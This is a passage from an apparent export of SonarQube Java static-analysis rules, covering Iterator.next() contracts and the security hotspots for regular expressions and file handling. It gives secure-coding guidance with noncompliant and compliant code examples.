boolean isFoo() {
 ...
}
</pre>","""@CheckForNull"" or ""@Nullable"" should not be used on primitive types",[],MINOR,[],CODE_SMELL
2015-01-08T13:39:42+0100,"<p>By contract, any implementation of the <code>java.util.Iterator.next()</code> method should throw a <code>NoSuchElementException</code> exception
when the iteration has no more elements. Any other behavior when the iteration is done could lead to unexpected behavior for users of this
<code>Iterator</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyIterator implements Iterator&lt;String&gt;{
  ...
  public String next(){
    if(!hasNext()){
      return null;
    }
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyIterator implements Iterator&lt;String&gt;{
  ...
  public String next(){
    if(!hasNext()){
      throw new NoSuchElementException();
    }
    ...
  }
}
</pre>",squid:S2272,java,Java,"<p>By contract, any implementation of the <code>java.util.Iterator.next()</code> method should throw a <code>NoSuchElementException</code> exception
when the iteration has no more elements. Any other behavior when the iteration is done could lead to unexpected behavior for users of this
<code>Iterator</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyIterator implements Iterator&lt;String&gt;{
  ...
  public String next(){
    if(!hasNext()){
      return null;
    }
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyIterator implements Iterator&lt;String&gt;{
  ...
  public String next(){
    if(!hasNext()){
      throw new NoSuchElementException();
    }
    ...
  }
}
</pre>","""Iterator.next()"" methods should throw ""NoSuchElementException""",[],MINOR,"['error-handling', 'unpredictable']",BUG
2018-11-12T11:11:26+0100,"<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021"">CVE-2017-16021</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863"">CVE-2018-13863</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926"">CVE-2018-8926</a> </li>
</ul>
<p>Regular Expressions are subject to different kinds of vulnerabilities.</p>
<p> </p>
<p>First, evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions
such as <code>(a+)+</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is that
with every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door to <a
href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">Regular expression Denial of Service (ReDoS)</a> attacks. In the
context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the
service inaccessible to genuine users.</p>
<p> </p>
<p>Another type of vulnerability can occur when regular expressions are used to validate user input. A regular expression can be used to filter unsafe
input by either matching a whole input when it is valid (example: the whole string should only contain alphanumeric characters) or by detecting
dangerous parts of an input. In both cases it is possible to let dangerous values through. For example, searching for <code>&lt;script&gt;</code> tags
in some HTML code with the regular expression <code>.*&lt;script&gt;.*</code> will miss <code>&lt;script id=""test""&gt;</code>.</p>
<p> </p>
<p>This rule flags any regular expression execution or compilation for review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> a user input string is executed as a regular-expression, or it is inserted in a regular expression. </li>
  <li> a user can provide a string which will be analyzed by a regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
  <li> the regular expression is used to validate unsafe input, but it does not detect all dangerous values. </li>
</ul>
<p>You may be at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid executing a user input string as a regular expression. If this is required, restrict the allowed regular expressions.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you're are using.</p>
<p>Test your regular expressions with techniques such as equivalence partitioning, and boundary value analysis, and test for robustness. Try not to
make complex regular expressions as they are difficult to understand and test. Note that some regular expression engines will match only part of the
input if no anchors are used. In PHP for example <code>preg_match(""/[A-Za-z0-9]+/"", $text)</code> will accept any string containing at least one
alphanumeric character because it has no anchors.</p>
<h2>Questionable Code Example</h2>
<pre>
import java.util.regex.Pattern;

class BasePattern {
  String regex; // a regular expression
  String input; // a user input

  void foo(CharSequence htmlString) {
    input.matches(regex);  // Questionable
    Pattern.compile(regex);  // Questionable
    Pattern.compile(regex, Pattern.CASE_INSENSITIVE);  // Questionable

    String replacement = ""test"";
    input.replaceAll(regex, replacement);  // Questionable
    input.replaceFirst(regex, replacement);  // Questionable

    if (!Pattern.matches("".*&lt;script&gt;.*"", htmlString)) { // Questionable, even if the pattern is hard-coded
    }
  }
}
</pre>
<p>This also applies for bean validation, where regexp can be specified:</p>
<pre>
import java.io.Serializable;
import javax.validation.constraints.Pattern;
import javax.validation.constraints.Email;
import org.hibernate.validator.constraints.URL;

class BeansRegex implements Serializable {
  @Pattern(regexp="".+@.+"")  // Questionable
  private String email;

  @Email(regexp="".+@.+"")  // Questionable
  private String email2;

  @URL(regexp="".*"") // Questionable
  private String url;
  // ...
}
</pre>
<h2>Exceptions</h2>
<p>Calls to <code>java.util.regex.Pattern.matcher(...)</code>, <code>java.util.regex.Pattern.split(...)</code> and all methods of
<code>java.util.regex.Matcher</code> are not highlighted as the pattern compilation is already highlighted.</p>
<p>Calls to <code>String.split(regex)</code> and <code>String.split(regex, limit)</code> will not raise an exception despite their use of a regular
expression. These methods are used most of the time to split on a single character, which doesn't create any vulnerability.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">MITRA, CWE-624</a> - Executable Regular Expression Error
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/185.html"">MITRA, CWE-185</a> - Incorrect Regular Expression </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",squid:S4784,java,Java,"<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021"">CVE-2017-16021</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863"">CVE-2018-13863</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926"">CVE-2018-8926</a> </li>
</ul>
<p>Regular Expressions are subject to different kinds of vulnerabilities.</p>
<p> </p>
<p>First, evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions
such as <code>(a+)+</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is that
with every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door to <a
href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">Regular expression Denial of Service (ReDoS)</a> attacks. In the
context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the
service inaccessible to genuine users.</p>
<p> </p>
<p>Another type of vulnerability can occur when regular expressions are used to validate user input. A regular expression can be used to filter unsafe
input by either matching a whole input when it is valid (example: the whole string should only contain alphanumeric characters) or by detecting
dangerous parts of an input. In both cases it is possible to let dangerous values through. For example, searching for <code>&lt;script&gt;</code> tags
in some HTML code with the regular expression <code>.*&lt;script&gt;.*</code> will miss <code>&lt;script id=""test""&gt;</code>.</p>
<p> </p>
<p>This rule flags any regular expression execution or compilation for review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> a user input string is executed as a regular-expression, or it is inserted in a regular expression. </li>
  <li> a user can provide a string which will be analyzed by a regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
  <li> the regular expression is used to validate unsafe input, but it does not detect all dangerous values. </li>
</ul>
<p>You may be at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid executing a user input string as a regular expression. If this is required, restrict the allowed regular expressions.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you're are using.</p>
<p>Test your regular expressions with techniques such as equivalence partitioning, and boundary value analysis, and test for robustness. Try not to
make complex regular expressions as they are difficult to understand and test. Note that some regular expression engines will match only part of the
input if no anchors are used. In PHP for example <code>preg_match(""/[A-Za-z0-9]+/"", $text)</code> will accept any string containing at least one
alphanumeric character because it has no anchors.</p>
<h2>Questionable Code Example</h2>
<pre>
import java.util.regex.Pattern;

class BasePattern {
  String regex; // a regular expression
  String input; // a user input

  void foo(CharSequence htmlString) {
    input.matches(regex);  // Questionable
    Pattern.compile(regex);  // Questionable
    Pattern.compile(regex, Pattern.CASE_INSENSITIVE);  // Questionable

    String replacement = ""test"";
    input.replaceAll(regex, replacement);  // Questionable
    input.replaceFirst(regex, replacement);  // Questionable

    if (!Pattern.matches("".*&lt;script&gt;.*"", htmlString)) { // Questionable, even if the pattern is hard-coded
    }
  }
}
</pre>
<p>This also applies for bean validation, where regexp can be specified:</p>
<pre>
import java.io.Serializable;
import javax.validation.constraints.Pattern;
import javax.validation.constraints.Email;
import org.hibernate.validator.constraints.URL;

class BeansRegex implements Serializable {
  @Pattern(regexp="".+@.+"")  // Questionable
  private String email;

  @Email(regexp="".+@.+"")  // Questionable
  private String email2;

  @URL(regexp="".*"") // Questionable
  private String url;
  // ...
}
</pre>
<h2>Exceptions</h2>
<p>Calls to <code>java.util.regex.Pattern.matcher(...)</code>, <code>java.util.regex.Pattern.split(...)</code> and all methods of
<code>java.util.regex.Matcher</code> are not highlighted as the pattern compilation is already highlighted.</p>
<p>Calls to <code>String.split(regex)</code> and <code>String.split(regex, limit)</code> will not raise an exception despite their use of a regular
expression. These methods are used most of the time to split on a single character, which doesn't create any vulnerability.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">MITRA, CWE-624</a> - Executable Regular Expression Error
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/185.html"">MITRA, CWE-185</a> - Incorrect Regular Expression </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Using regular expressions is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-11-12T11:11:26+0100,"<p>Handling files is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0358"">CVE-2018-0358</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7560"">CVE-2017-7560</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4015"">CVE-2005-4015</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3835"">CVE-2018-3835</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8008"">CVE-2018-8008</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2320"">CVE-2010-2320</a> </li>
</ul>
<p>Any access to the file system can create a vulnerability. Exposing a file's content, path or even its existence or absence is dangerous. It is also
extremely risky to create or write files without making sure that their permission and content is safe and controlled. Using a file path or reading a
file content must be always done with caution as they could have been tampered with.</p>
<p>The file system is a resource which can be easily exhausted. Opening too many files will use up all file descriptors, preventing other software
from opening files. Filling the storage space will also prevent any additional write from happening.</p>
<p>This rule flags code that initiates the use of files. It does not highlight how the files are used as this is often done in external libraries or
via abstractions like <code>InputStream</code>. It focuses instead on the creation of <code>java.io.File</code> or equivalent from a
<code>String</code>. This action indicates that one or multiple files will be processed just after this code. The goal is to guide manual security
code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the file or directory path you are using is coming from a user input or could have been tampered with. </li>
  <li> the code exposes to an unauthorized person the existence of a file or directory. Any hint given to a user might be dangerous. The information
  could be given by displaying an error if the file/directory does not exist or just by returning an ""Unauthorized"" error when the file/directory
  exists but the person can't perform an action. </li>
  <li> the code exposes to an unauthorized person the paths of files and/or directories, for example by listing the content of a directory and
  displaying the output. </li>
  <li> a file or directory may be created with the wrong permissions. </li>
  <li> an unvalidated user input is written into a file. </li>
  <li> a file is read and its content is used without being validated. </li>
  <li> a file is read and its content is exposed to an unauthorized person. </li>
  <li> a file is open, created or written into each time a user performs an action. </li>
  <li> files are open and not closed before executing a child process. This is only dangerous if file descriptors are inherited in your programming
  language (example: C, C++). </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid using paths provided by users or other untrusted sources if possible. If this is required, check that the path does not reference an
unauthorized directory or file. See <a href=""https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)"">OWASP
recommendations</a> as to how to test for directory traversal. Note that the paths length should be validated too.</p>
<p>No File and directory names should be exposed. They can contain sensitive information. This means that a user should not be able to list the
content of unauthorized directories.</p>
<p>Make sure that no attackers can test for the existence or absence of sensitive files. Knowing that a specific file exists can reveal a
vulnerability or at least expose file and directory names.</p>
<p>Files and directories should be created with restricted permissions and ownership. Only authorized users and applications should be able to access
the files, and they should have as little permissions as needed. Modifying a file's permissions is not good enough. The permissions should be
restricted from the very beginning.</p>
<p>Writing user input into files should be done with caution. It could fill the storage space if the amount of data written is not controlled. It
could also write dangerous data which will later be used by an application or returned to another user. This is why the user input should be validated
before being written.</p>
<p>Reading a file can lead to other vulnerabilities. Any file could have been modified by an attacker. Thus the same validation as for any user input
should be performed on file content.</p>
<p>Once a file is read, its content should only be exposed to authorized users.</p>
<p>Add limits to the number of files your application access simultaneously or create because of a user action. It is possible to perform a Denial of
Service attack by opening too many files, and thus exhausting available file descriptors, or by filling the file system with new files. Release file
descriptors by closing files as soon as possible.</p>
<p>We also recommended to have tools monitoring your system and alerting you whenever resources are nearly exhausted.</p>
<p>Do not allow untrusted code to access the filesystem. For some programming languages, child-processes may have access to file descriptors opened by
the parent process before the creation of the child process. This creates a vulnerability when a child process doesn't have the permission to access a
file but is still able to modify it via the inherited file descriptor. Check your language documentation for ""file descriptor leak"" or the use of the
flags <code>O_CLOEXEC</code>, <code>FD_CLOEXEC</code>, or <code>bInheritHandles</code>. File descriptors can be inherited in the following languages:
C, C++, C#, Objective-C, Swift, Go (but disabled by default), some JVM versions, Javascript and TypeScript in Nodejs, Some PHP versions, Python, Ruby,
Rust, VB6 and VB.NET.</p>
<h2>Questionable Code Example</h2>
<pre>
// === java.io.File ===
import java.io.File;

class A {
    void foo(String strPath, String StrParent, String StrChild, String prefix, String suffix, java.net.URI uri) throws Exception {

        // Questionable: check what is done with this file
        new File(strPath);
        new File(StrParent, StrChild);
        new File(uri);
        File.createTempFile(prefix, suffix);
    }
}
</pre>
<pre>
// === java.nio.file ===
import java.nio.file.attribute.FileAttribute;
import java.nio.file.*;

class A {
    void foo(FileSystem fileSystem, java.net.URI uri, String part1, String part2, String prefix, FileAttribute&lt;?&gt; attrs,
            String suffix) throws Exception {
        Path path = Paths.get(part1, part2); // Questionable
        Path path2 = Paths.get(uri); // Questionable

        Iterable&lt;Path&gt; paths = fileSystem.getRootDirectories(); // Questionable
        Path path3 = fileSystem.getPath(part1, part2); // Questionable

        Path path4 = Files.createTempDirectory(prefix, attrs); // Questionable
        Path path5 = Files.createTempFile(prefix, suffix, attrs); // Questionable
    }
}
</pre>
<pre>
// === Opening file from a string path ===
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.RandomAccessFile;

class A {
    void foo(String mode) throws Exception {
        FileReader reader = new FileReader(""test.txt""); // Questionable
        FileInputStream instream = new FileInputStream(""test.txt""); // Questionable
        FileWriter writer = new FileWriter(""out.txt""); // Questionable
        FileOutputStream outstream = new FileOutputStream(""out2.txt""); // Questionable
        RandomAccessFile file = new RandomAccessFile(""test.txt"", mode); // Questionable
    }
}
</pre>
<pre>
// ===  org.apache.commons.io.FileUtils ===
import org.apache.commons.io.FileUtils;

class A {
    void foo() {
        FileUtils.getFile(""test.txt""); // Questionable
        FileUtils.getTempDirectory(); // Questionable
        FileUtils.getUserDirectory(); // Questionable
    }
}
</pre>
<pre>
// === Guava ===
import java.nio.charset.Charset;

import com.google.common.io.FileBackedOutputStream;
import com.google.common.io.MoreFiles;
import com.google.common.io.Resources;
import com.google.common.io.Files;
import com.google.common.io.LineProcessor;

class M {
    void foo(java.net.URL url, Charset charset, java.io.OutputStream stream, String resourceName, Class&lt;?&gt; contextClass,
            LineProcessor&lt;Object&gt; callback, int fileThreshold, boolean resetOnFinalize) throws Exception {

        Files.createTempDir(); // Questionable
        Files.fileTreeTraverser(); // Questionable (removed from public API in Guava 25.0)
        Files.fileTraverser(); // Questionable
        MoreFiles.directoryTreeTraverser(); // Questionable (removed from public API in Guava 25.0)
        MoreFiles.fileTraverser(); // Questionable
        Resources.asByteSource(url); // Questionable
        Resources.asCharSource(url, charset); // Questionable
        Resources.copy(url, stream); // Questionable
        Resources.getResource(contextClass, resourceName); // Questionable
        Resources.getResource(resourceName); // Questionable
        Resources.readLines(url, charset); // Questionable
        Resources.readLines(url, charset, callback); // Questionable
        Resources.toByteArray(url); // Questionable
        Resources.toString(url, charset); // Questionable

        // these OutputStreams creates files
        new FileBackedOutputStream(fileThreshold); // Questionable
        new FileBackedOutputStream(fileThreshold, resetOnFinalize); // Questionable
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't highlight any function call receiving a <code>Path</code> or <code>File</code> arguments as the arguments themselves have been
highlighted before.</p>
<p>For example we highlight new <code>File(String parent, String child)</code> but not new <code>File(File parent, String child)</code> as the parent
<code>File</code> should have been flagged earlier.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/732"">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/73"">MITRE, CWE-73</a> - External Control of File Name or Path </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/538"">MITRE, CWE-538</a> - File and Directory Information Exposure </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/403"">MITRE, CWE-403</a> - Exposure of File Descriptor to Unintended Control Sphere ('File
  Descriptor Leak') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/g4HWAw"">CERT, FIO01-J.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/KQU"">CERT, FIO06-C.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/c/FIO22-C.+Close+files+before+spawning+processes"">CERT, FIO22-C.</a> Close files before
  spawning processes </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",squid:S4797,java,Java,"<p>Handling files is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0358"">CVE-2018-0358</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7560"">CVE-2017-7560</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4015"">CVE-2005-4015</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3835"">CVE-2018-3835</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8008"">CVE-2018-8008</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2320"">CVE-2010-2320</a> </li>
</ul>
<p>Any access to the file system can create a vulnerability. Exposing a file's content, path or even its existence or absence is dangerous. It is also
extremely risky to create or write files without making sure that their permission and content is safe and controlled. Using a file path or reading a
file content must be always done with caution as they could have been tampered with.</p>
<p>The file system is a resource which can be easily exhausted. Opening too many files will use up all file descriptors, preventing other software
from opening files. Filling the storage space will also prevent any additional write from happening.</p>
<p>This rule flags code that initiates the use of files. It does not highlight how the files are used as this is often done in external libraries or
via abstractions like <code>InputStream</code>. It focuses instead on the creation of <code>java.io.File</code> or equivalent from a
<code>String</code>. This action indicates that one or multiple files will be processed just after this code. The goal is to guide manual security
code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the file or directory path you are using is coming from a user input or could have been tampered with. </li>
  <li> the code exposes to an unauthorized person the existence of a file or directory. Any hint given to a user might be dangerous. The information
  could be given by displaying an error if the file/directory does not exist or just by returning an ""Unauthorized"" error when the file/directory
  exists but the person can't perform an action. </li>
  <li> the code exposes to an unauthorized person the paths of files and/or directories, for example by listing the content of a directory and
  displaying the output. </li>
  <li> a file or directory may be created with the wrong permissions. </li>
  <li> an unvalidated user input is written into a file. </li>
  <li> a file is read and its content is used without being validated. </li>
  <li> a file is read and its content is exposed to an unauthorized person. </li>
  <li> a file is open, created or written into each time a user performs an action. </li>
  <li> files are open and not closed before executing a child process. This is only dangerous if file descriptors are inherited in your programming
  language (example: C, C++). </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid using paths provided by users or other untrusted sources if possible. If this is required, check that the path does not reference an
unauthorized directory or file. See <a href=""https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)"">OWASP
recommendations</a> as to how to test for directory traversal. Note that the paths length should be validated too.</p>
<p>No File and directory names should be exposed. They can contain sensitive information. This means that a user should not be able to list the
content of unauthorized directories.</p>
<p>Make sure that no attackers can test for the existence or absence of sensitive files. Knowing that a specific file exists can reveal a
vulnerability or at least expose file and directory names.</p>
<p>Files and directories should be created with restricted permissions and ownership. Only authorized users and applications should be able to access
the files, and they should have as little permissions as needed. Modifying a file's permissions is not good enough. The permissions should be
restricted from the very beginning.</p>
<p>Writing user input into files should be done with caution. It could fill the storage space if the amount of data written is not controlled. It
could also write dangerous data which will later be used by an application or returned to another user. This is why the user input should be validated
before being written.</p>
<p>Reading a file can lead to other vulnerabilities. Any file could have been modified by an attacker. Thus the same validation as for any user input
should be performed on file content.</p>
<p>Once a file is read, its content should only be exposed to authorized users.</p>
<p>Add limits to the number of files your application access simultaneously or create because of a user action. It is possible to perform a Denial of
Service attack by opening too many files, and thus exhausting available file descriptors, or by filling the file system with new files. Release file
descriptors by closing files as soon as possible.</p>
<p>We also recommended to have tools monitoring your system and alerting you whenever resources are nearly exhausted.</p>
<p>Do not allow untrusted code to access the filesystem. For some programming languages, child-processes may have access to file descriptors opened by
the parent process before the creation of the child process. This creates a vulnerability when a child process doesn't have the permission to access a
file but is still able to modify it via the inherited file descriptor. Check your language documentation for ""file descriptor leak"" or the use of the
flags <code>O_CLOEXEC</code>, <code>FD_CLOEXEC</code>, or <code>bInheritHandles</code>. File descriptors can be inherited in the following languages:
C, C++, C#, Objective-C, Swift, Go (but disabled by default), some JVM versions, Javascript and TypeScript in Nodejs, Some PHP versions, Python, Ruby,
Rust, VB6 and VB.NET.</p>
<h2>Questionable Code Example</h2>
<pre>
// === java.io.File ===
import java.io.File;

class A {
    void foo(String strPath, String StrParent, String StrChild, String prefix, String suffix, java.net.URI uri) throws Exception {

        // Questionable: check what is done with this file
        new File(strPath);
        new File(StrParent, StrChild);
        new File(uri);
        File.createTempFile(prefix, suffix);
    }
}
</pre>
<pre>
// === java.nio.file ===
import java.nio.file.attribute.FileAttribute;
import java.nio.file.*;

class A {
    void foo(FileSystem fileSystem, java.net.URI uri, String part1, String part2, String prefix, FileAttribute&lt;?&gt; attrs,
            String suffix) throws Exception {
        Path path = Paths.get(part1, part2); // Questionable
        Path path2 = Paths.get(uri); // Questionable

        Iterable&lt;Path&gt; paths = fileSystem.getRootDirectories(); // Questionable
        Path path3 = fileSystem.getPath(part1, part2); // Questionable

        Path path4 = Files.createTempDirectory(prefix, attrs); // Questionable
        Path path5 = Files.createTempFile(prefix, suffix, attrs); // Questionable
    }
}
</pre>
<pre>
// === Opening file from a string path ===
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.RandomAccessFile;

class A {
    void foo(String mode) throws Exception {
        FileReader reader = new FileReader(""test.txt""); // Questionable
        FileInputStream instream = new FileInputStream(""test.txt""); // Questionable
        FileWriter writer = new FileWriter(""out.txt""); // Questionable
        FileOutputStream outstream = new FileOutputStream(""out2.txt""); // Questionable
        RandomAccessFile file = new RandomAccessFile(""test.txt"", mode); // Questionable
    }
}
</pre>
<pre>
// ===  org.apache.commons.io.FileUtils ===
import org.apache.commons.io.FileUtils;

class A {
    void foo() {
        FileUtils.getFile(""test.txt""); // Questionable
        FileUtils.getTempDirectory(); // Questionable
        FileUtils.getUserDirectory(); // Questionable
    }
}
</pre>
<pre>
// === Guava ===
import java.nio.charset.Charset;

import com.google.common.io.FileBackedOutputStream;
import com.google.common.io.MoreFiles;
import com.google.common.io.Resources;
import com.google.common.io.Files;
import com.google.common.io.LineProcessor;

class M {
    void foo(java.net.URL url, Charset charset, java.io.OutputStream stream, String resourceName, Class&lt;?&gt; contextClass,
            LineProcessor&lt;Object&gt; callback, int fileThreshold, boolean resetOnFinalize) throws Exception {

        Files.createTempDir(); // Questionable
        Files.fileTreeTraverser(); // Questionable (removed from public API in Guava 25.0)
        Files.fileTraverser(); // Questionable
        MoreFiles.directoryTreeTraverser(); // Questionable (removed from public API in Guava 25.0)
        MoreFiles.fileTraverser(); // Questionable
        Resources.asByteSource(url); // Questionable
        Resources.asCharSource(url, charset); // Questionable
        Resources.copy(url, stream); // Questionable
        Resources.getResource(contextClass, resourceName); // Questionable
        Resources.getResource(resourceName); // Questionable
        Resources.readLines(url, charset); // Questionable
        Resources.readLines(url, charset, callback); // Questionable
        Resources.toByteArray(url); // Questionable
        Resources.toString(url, charset); // Questionable

        // these OutputStreams creates files
        new FileBackedOutputStream(fileThreshold); // Questionable
        new FileBackedOutputStream(fileThreshold, resetOnFinalize); // Questionable
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't highlight any function call receiving a <code>Path</code> or <code>File</code> arguments as the arguments themselves have been
highlighted before.</p>
<p>For example we highlight new <code>File(String parent, String child)</code> but not new <code>File(File parent, String child)</code> as the parent
<code>File</code> should have been flagged earlier.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/732"">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/73"">MITRE, CWE-73</a> - External Control of File Name or Path </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/538"">MITRE, CWE-538</a> - File and Directory Information Exposure </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/403"">MITRE, CWE-403</a> - Exposure of File Descriptor to Unintended Control Sphere ('File
  Descriptor Leak') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/g4HWAw"">CERT, FIO01-J.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/KQU"">CERT, FIO06-C.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/c/FIO22-C.+Close+files+before+spawning+processes"">CERT, FIO22-C.</a> Close files before
  spawning processes </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Handling files is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous', 'sans-top25-risky']",SECURITY_HOTSPOT
2018-06-07T12:32:41+0200,"<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
